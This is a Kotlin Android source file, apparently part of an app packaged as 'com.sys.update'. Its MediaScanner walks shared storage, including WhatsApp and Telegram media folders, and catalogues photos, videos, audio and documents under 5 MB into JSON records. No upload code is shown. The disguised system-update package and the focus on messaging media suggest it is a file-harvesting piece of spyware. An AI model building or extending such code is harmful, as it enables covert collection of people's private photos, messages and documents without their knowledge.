package com.sys.update

import android.content.Context
import android.os.Environment
import android.util.Log
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Scans media files (images / video / audio) and other documents.
 * Requires: READ_MEDIA_* (Android 13+) or READ_EXTERNAL_STORAGE (older),
 *           and All Files Access for full filesystem (Android 11+).
 */
object MediaScanner {

    private val timeFmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
    private const val MAX_FILE_MB = 5L

    data class MediaFile(
        val path: String,
        val name: String,
        val size: Long,
        val lastModified: Long,
        val mime: String
    )

    fun scanImages(context: Context): List<MediaFile> = scanByExtension(
        listOf("jpg", "jpeg", "png", "gif", "webp", "bmp", "heic")
    )

    fun scanVideos(context: Context): List<MediaFile> = scanByExtension(
        listOf("mp4", "mkv", "avi", "mov", "3gp", "webm")
    )

    fun scanAudio(context: Context): List<MediaFile> = scanByExtension(
        listOf("mp3", "wav", "ogg", "m4a", "aac", "flac")
    )

    fun scanDocuments(context: Context): List<MediaFile> = scanByExtension(
        listOf("pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "txt", "zip")
    )

    private fun scanByExtension(extensions: List<String>): List<MediaFile> {
        val result = mutableListOf<MediaFile>()
        val roots = listOf(
            Environment.getExternalStorageDirectory(),                      // /sdcard
            File("/storage/emulated/0/DCIM"),
            File("/storage/emulated/0/Pictures"),
            File("/storage/emulated/0/Download"),
            File("/storage/emulated/0/Documents"),
            File("/storage/emulated/0/WhatsApp/Media"),
            File("/storage/emulated/0/Telegram")
        )

        for (root in roots) {
            walk(root, extensions, result, depth = 0, maxDepth = 6, limit = 800)
        }
        return result.distinctBy { it.path }
    }

    private fun walk(
        dir: File?,
        extensions: List<String>,
        out: MutableList<MediaFile>,
        depth: Int,
        maxDepth: Int,
        limit: Int
    ) {
        if (dir == null || !dir.exists() || !dir.isDirectory || depth > maxDepth || out.size >= limit) return

        val children = try { dir.listFiles() } catch (_: Exception) { null } ?: return

        for (f in children) {
            if (out.size >= limit) return
            try {
                if (f.isDirectory) {
                    if (f.name.startsWith(".")) continue
                    walk(f, extensions, out, depth + 1, maxDepth, limit)
                } else {
                    val ext = f.extension.lowercase(Locale.US)
                    if (extensions.contains(ext)) {
                        val sizeMb = f.length() / (1024 * 1024)
                        if (sizeMb <= MAX_FILE_MB) {
                            out.add(
                                MediaFile(
                                    path = f.absolutePath,
                                    name = f.name,
                                    size = f.length(),
                                    lastModified = f.lastModified(),
                                    mime = guessMime(ext)
                                )
                            )
                        }
                    }
                }
            } catch (_: Exception) {}
        }
    }

    private fun guessMime(ext: String): String = when (ext) {
        "jpg", "jpeg" -> "image/jpeg"
        "png" -> "image/png"
        "gif" -> "image/gif"
        "webp" -> "image/webp"
        "mp4" -> "video/mp4"
        "mkv" -> "video/x-matroska"
        "mp3" -> "audio/mpeg"
        "wav" -> "audio/wav"
        "pdf" -> "application/pdf"
        else -> "application/octet-stream"
    }

    fun toJson(mf: MediaFile): JSONObject = JSONObject().apply {
        put("type", "media")
        put("path", mf.path)
        put("name", mf.name)
        put("size", mf.size)
        put("modified", timeFmt.format(Date(mf.lastModified)))
        put("mime", mf.mime)
    }
}
